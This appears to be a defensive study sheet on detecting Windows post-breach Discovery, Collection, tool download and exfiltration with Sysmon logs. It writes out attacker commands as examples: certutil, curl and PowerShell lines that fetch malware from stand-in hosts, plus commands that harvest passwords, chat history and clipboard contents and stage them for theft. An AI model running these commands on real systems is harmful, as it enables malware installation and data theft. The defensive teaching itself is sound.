# 🛡️ Windows Threat Detection 2 — Reference Sheet

> **TL;DR:** After Initial Access, threat actors typically move into **Discovery → Collection → Exfiltration**, often using built-in Windows commands (`whoami`, `ipconfig`, `net user`, `tasklist`) plus **Ingress Tool Transfer** to pull in additional malware. Defenders detect this chain primarily with **Sysmon Event IDs 1 (Process Create), 3 (Network Connect), and 22 (DNS Query)** — reconstructing the process tree via `ProcessId` ↔ `ParentProcessId` and tracking suspicious commands, file access patterns, archiving, and outbound connections to cloud storage or attacker-controlled domains.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| Discovery commands look legitimate | `ipconfig`, `whoami`, `tasklist` are used daily by IT — context (parent process, command sequence, timing) is what makes them malicious |
| Watching the console ≠ forensics | Real malware is silent; you must reconstruct the attack from Sysmon logs alone, not from runtime output |
| Process tree requires correlation | You must manually correlate `ProcessId` with `ParentProcessId` across Event ID 1 entries — Sysmon does not display a tree by default |
| GUI Discovery leaves no `whoami` | RDP-based attackers may use `mmc.exe`, `control.exe`, `taskmgr.exe`, `notepad.exe` instead of CMD — different signatures |
| Data stealers don't use CMD | They invoke Windows APIs directly from their own code, so Event ID 1 won't show file paths — you must analyze the binary itself |
| Exfiltration often hides in trusted domains | S3, Dropbox, GitHub, Telegram are common — don't assume "AWS = safe" |
| Event ID 22 fires BEFORE Event ID 3 | DNS resolution happens first; that's why DNS queries reveal exfil domains "as soon as exfiltration starts" |
| Certutil is not just for certificates | `certutil -urlcache -f` is a classic LOLBin for downloading malware |
| Curl ships with Windows 10+ | Attackers no longer need to bring their own download tool |
| Staging directories are a tell | A new folder (e.g. `staging_58f1`) in `%TEMP%` containing mixed file types = likely Collection in progress |
| Compression before exfil is normal attacker behavior | `Compress-Archive`, `7za.exe a -tzip` reduce C2 beacons and improve stealth |
| Single phishing payload ≠ full attack | Attackers split malware to bypass AV — expect Ingress Tool Transfer mid-attack |

## 🔍 Section 1 — Discovery (MITRE Tactic)

### Purpose

After breaching a host, threat actors need to answer **"Who am I? Where am I? What can I steal? What will stop me?"** Most discovery commands are native Windows binaries — making detection a matter of context, not signatures.

### Discovery Command Reference Table

| Discovery Goal | Purpose | Common CMD / PowerShell Commands |
|---|---|---|
| **Files and Folders** | Find host purpose, victim's job, interests | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>` |
| **Users and Groups** | Find out who uses the host and privileges | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` |
| **System and Apps** | Find vulnerabilities, apps to steal from | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` |
| **Network Settings** | Determine if host is on a corporate network | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` |
| **Active Antivirus** | Assess detection risk before continuing | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

### Key Discovery Commands

#### `net user <username>`

**Purpose:** Show local user account details, including group memberships.

```cmd
net user Administrator
# Lists account properties and "Local Group Memberships"
# Example: "*Administrators" → privileged account
```

#### `whoami /priv`

**Purpose:** Show current token privileges (used to assess what the attacker can do).

```cmd
whoami /priv
# Lists privileges like SeDebugPrivilege, SeImpersonatePrivilege
```

#### `tasklist /v | findstr <process>`

**Purpose:** Check if a security product is running.

```cmd
cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"
# Returns MsSense.exe row if MS Defender for Endpoint is running
# Otherwise prints "No MS Defender EDR"
```

#### Antivirus Discovery via WMI

**Purpose:** Enumerate installed AV products via the SecurityCenter2 namespace.

```powershell
Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"
# Returns displayName, productState, pathToSignedReportingExe for each AV
```

### Discovery Method Comparison

| Method | Trigger | Typical Process Tree Root | Detection Surface |
|---|---|---|---|
| **CMD/PowerShell Discovery** | Phishing payload, malware C2 | `cmd.exe` / `powershell.exe` (often spawned by `invoice.pdf.exe`) | Sysmon Event ID 1, PowerShell history |
| **GUI Discovery** | Interactive RDP session | `explorer.exe` spawning `mmc.exe`, `control.exe`, `notepad.exe` | Sysmon Event ID 1 (no "whoami" entries) |

## 🕵️ Section 2 — Detecting Discovery

### Detection Workflow

| Step | Action | Tool / Source |
|---|---|---|
| 1 | Filter for process creation events | Sysmon **Event ID 1** |
| 2 | Look for sequences of Discovery commands in a short time window | Timeline analysis |
| 3 | Build the process tree | Correlate `ProcessId` ↔ `ParentProcessId` |
| 4 | Identify the parent (malicious binary?) | Check `ParentImage` and `Image` fields |
| 5 | Look up unknown commands | Web search / MITRE ATT&CK |

### Example Malicious Process Tree

```
C:\Users\victim\Downloads\invoice.pdf.exe
├── C:\Windows\System32\cmd.exe
│   ├── ipconfig                            # Network settings
│   ├── whoami /priv                        # User permissions
│   ├── dir                                 # List current directory
│   ├── net user                            # List local users
│   ├── tasklist /v                         # Running processes
│   └── wmic computersystem get model       # Laptop model
└── C:\Windows\...\powershell.exe
    ├── Get-Service                         # Active services
    └── Get-MpPreference                    # MS Defender settings
```

### Example GUI Discovery Tree

```
C:\Windows\System32\explorer.exe
├── cmd.exe                                 # Attacker may still drop to CMD
├── mmc.exe compmgmt.msc                    # Computer Management
├── control.exe netconnections              # Network adapters
├── SystemSettings.exe                      # Settings panel
├── notepad.exe C:\...\secrets.txt          # Read sensitive file
└── taskmgr.exe                             # Task Manager
```

## 📦 Section 3 — Collection (MITRE Tactic)

### Purpose

Once Discovery is done, attackers move to **Collection** — grabbing the actual data (files, credentials, browser sessions, registry secrets, memory contents). Goals vary by attacker.

### Collection Targets by Attacker Goal

| Attacker Goal | Typical Targets | Example Paths |
|---|---|---|
| **Blackmail victim** | Photos, chats, browser history | `C:\Users\<user>\AppData\Roaming\Signal\*`<br>`C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History` |
| **Steal money** | Crypto wallets, banking sessions, cookies | `C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat`<br>`C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies` |
| **Steal corporate data** | SSH keys, databases, internal docs | `C:\Users\<user>\.ssh\*`<br>`C:\Program Files\Microsoft SQL Server\...\DATA\*` |

### Data Storage Locations to Watch

| Storage Type | Example |
|---|---|
| **Plain files** | `.docx`, `.pdf`, `.xlsx`, `.txt` in Desktop/Downloads/Documents |
| **Registry** | Saved credentials, app config |
| **Process memory** | Decrypted secrets, tokens, session keys |
| **Browser stores** | Chrome `Login Data`, `Cookies`, `History`, `Web Data` |

## 🔎 Section 4 — Detecting Collection

### Collection Command Detection Patterns

| Command Example | Description |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Threat actor opened a sensitive file with Notepad |
| `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Searched for "password" keyword in a file |
| `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Recursively searched for PDFs |
| `copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\` | Copied Signal chat history to staging directory |
| `Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip` | Archived staged data (pre-exfil) |
| `7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*` | Used 7-Zip to archive (alternative to native compression) |

### Manual Collection vs Data Stealer Comparison

| Aspect | Manual (Human Attacker) | Automated (Data Stealer Malware) |
|---|---|---|
| **Typical target** | Big corporate networks | Personal workstations |
| **Tools used** | Notepad, Wordpad, 7-Zip, CMD | Custom binary using Windows APIs directly |
| **Time required** | Hours (manual review) | Seconds to minutes |
| **Sysmon visibility** | High — every file open = Event ID 1 | Low — no CMD/PowerShell child processes |
| **Detection method** | Process creation events | Network connection + DNS query + behavioral |
| **Example** | The DFIR Report incidents | Gremlin Stealer (Unit42) |

### Real Data Stealer Behavior (e.g. Gremlin)

| Capability | Targets |
|---|---|
| VPN profiles | OpenVPN, NordVPN, etc. |
| Crypto wallets | Bitcoin, Ethereum wallet files |
| Browser sessions | Cookies, saved passwords |
| Gaming/comms apps | Steam, Discord, Telegram (`tdata` folder) |
| Clipboard | Via `Get-Clipboard` or `GetClipboardData` API |
| Screenshots | Of victim's desktop |

### Stealer Attack Chain (Sample from Lab)

| Stage | Sysmon Evidence | Example |
|---|---|---|
| 1. Stage SSH keys | Event ID 1: `copy` to `staging_58f1` | `thm-access-database.key`, `thm-access-database.pub` |
| 2. Search documents | Event ID 1: stealer.exe child processes searching `*.docx`, `*.pdf`, `*.xlsx` | Found `thm-network-diagram-2025.pdf` |
| 3. Steal browser data | Event ID 1: file copy from Chrome `User Data\Default` | `Login Data`, `Cookies`, `Web Data` |
| 4. Capture clipboard | Event ID 1: `powershell -c "Get-Clipboard" > clipboard.txt` | Captures pasted passwords, keys |
| 5. Archive staged data | Event ID 1: `Compress-Archive -Path staging_58f1 -DestinationPath staging_58f1.zip` | Compresses for efficient exfil |
| 6. Exfiltrate | Event ID 22: DNS query → Event ID 3: TCP 443 to S3 bucket | `collecteddata-storage-2025.s3.amazonaws.com` |

## 📥 Section 5 — Ingress Tool Transfer

### Purpose

Attackers rarely bring everything in the initial payload — they download additional tools post-breach to bypass AV and minimize tool exposure. This is the **MITRE Ingress Tool Transfer** technique.

### Why Split the Payload?

| Reason | Detail |
|---|---|
| **AV evasion** | Smaller initial payload = less detection surface |
| **Tool protection** | If caught early, attacker doesn't lose expensive exploits |
| **Modularity** | Pull only the tool needed for the current stage |
| **Updates** | Switch payloads without re-phishing |

### Typical Post-Breach Tool Downloads

| Tool Category | Example Tool | Purpose |
|---|---|---|
| Discovery automation | **Seatbelt** | Enumerate vulnerabilities, configs |
| Credential extraction | **Mimikatz** | Dump LSASS, extract creds |
| Remote Access Trojan | **Remcos RAT** | Full remote control |
| Ransomware | Custom binary | Final-stage encryption |

### Ingress Tool Transfer Command Reference

| Method | Command | Notes |
|---|---|---|
| **certutil** | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` | Built-in; classic LOLBin abuse |
| **curl** | `curl.exe https://blackhat.thm/bad.exe -o good.exe` | Available on Windows 10+ |
| **PowerShell IWR** | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` | Most common in scripted attacks |
| **GUI / Browser** | Open Chrome/Edge, navigate, save | No CMD logs — only browser history |
| **RDP copy-paste** | Drag-drop or clipboard transfer | No download event at all |

### Command Examples with Output

#### certutil download

```cmd
certutil.exe -urlcache -f http://appsforfree.thm/trojan.exe trojan.exe
# -urlcache: use URL cache facility
# -f: force download (overwrite cache)
# Output: "CertUtil: -URLCache command completed successfully."
```

#### curl download

```cmd
curl.exe http://appsforfree.thm/trojan.exe -o trojan.exe
# -o: write output to file
# Output: progress bar showing transfer
```

#### PowerShell IWR download

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'trojan.exe'"
# -Uri: source URL
# -OutFile: destination file path
```

### Detecting Tool Transfer

| Detection Source | What to Look For |
|---|---|
| **Sysmon Event ID 3** | Network connection from unusual process (`certutil.exe`, `cmd.exe`) |
| **Sysmon Event ID 22** | DNS query from unusual process |
| **Sysmon Event ID 11** | File create event for newly downloaded binary |
| **Process chain** | `cmd.exe` → `certutil.exe` connecting outbound = highly suspicious |
| **Destination analysis** | Even GitHub/cloud domains need scrutiny — check process + filename |

## 🚚 Section 6 — Exfiltration Channels

Threat actors prefer **trustworthy-looking destinations** to evade detection:

| Channel | Examples | Why it works |
|---|---|---|
| **Cloud storage** | Dropbox, Mega, Amazon S3, Google Drive | TLS-encrypted, trusted reputation |
| **Code repos** | GitHub (gists, repos) | Common in dev environments |
| **Messengers** | Telegram, Discord webhooks | API-based, encrypted |
| **Lookalike domains** | `windows-updates.com`, `secure-microsoft.net` | Typo-squatting trusted brands |

## 🎯 Section 7 — Critical Sysmon Event IDs (Master Reference)

| Event ID | What It Logs | When to Use | Key Fields |
|---|---|---|---|
| **1** | **Process Creation** | Find what processes/commands ran | `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `ProcessId`, `ParentProcessId`, `User` |
| **3** | **Network Connection** | Identify established outbound connections | `Image`, `SourceIp`, `DestinationIp`, `DestinationHostname`, `DestinationPort`, `Protocol` |
| **11** | **File Create** | Detect dropped files (downloads, staged data) | `Image`, `TargetFilename` |
| **22** | **DNS Query** | Find domains queried (fires *before* Event ID 3) | `Image`, `QueryName`, `QueryResults`, `ProcessId` |

### Event ID Priority by Investigation Goal

| Investigation Goal | Primary Event ID | Reason |
|---|---|---|
| **What commands did the attacker run?** | **Event ID 1** | CommandLine field exposes every argument |
| **What C2 infrastructure was contacted?** | **Event ID 22** | DNS queries reveal domain names (not just IPs) |
| **What network connections were established?** | **Event ID 3** | Confirms actual data transfer occurred |
| **What files were dropped on disk?** | **Event ID 11** | Captures every file creation event |

| Step | MITRE Tactic | Action | Sysmon Evidence |
